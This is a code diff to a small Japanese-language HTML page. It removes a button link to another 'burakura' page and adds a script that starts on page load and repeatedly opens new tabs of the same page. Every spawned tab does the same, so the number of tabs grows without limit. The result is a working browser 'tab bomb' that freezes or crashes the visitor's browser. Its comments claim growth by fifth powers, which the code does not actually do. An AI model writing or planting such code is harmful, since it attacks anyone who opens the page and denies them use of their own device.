@@ -3,25 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>リンクのボタン</title>
+    <title>重いタブを生成</title>
     <style>
-        /* ボタン風のリンクスタイル */
-        .button-link {
-            display: inline-block;
-            padding: 10px 20px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #007bff;
-            text-decoration: none;
-            border-radius: 5px;
+        body {
+            font-family: Arial, sans-serif;
             text-align: center;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
         }
-        .button-link:hover {
-            background-color: #0056b3;
+        #status {
+            font-size: 1.5rem;
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <a href="https://castoroides.github.io/burakura/burakura_2.html" class="button-link">押したあとベージブロックを解け。</a>
+    <h1>タブを5乗ずつ増やす</h1>
+    <div id="status">タブ生成を開始します...</div>
+
+    <script>
+        let tabCount = 1;
+
+        function openTabsRecursively(count) {
+            const statusElement = document.getElementById('status');
+            statusElement.textContent = `現在のタブ数: ${count}`;
+
+            // Open `count` new tabs
+            for (let i = 0; i < count; i++) {
+                window.open(window.location.href, '_blank');
+            }
+
+            // Calculate the next count (raise to the 5th power)
+            const nextCount = Math.pow(count, 5);
+
+            // Delay before the next round of tab creation
+            setTimeout(() => openTabsRecursively(nextCount), 2000);
+        }
+
+        // Start the recursive tab creation process
+        openTabsRecursively(tabCount);
+    </script>
 </body>
 </html>
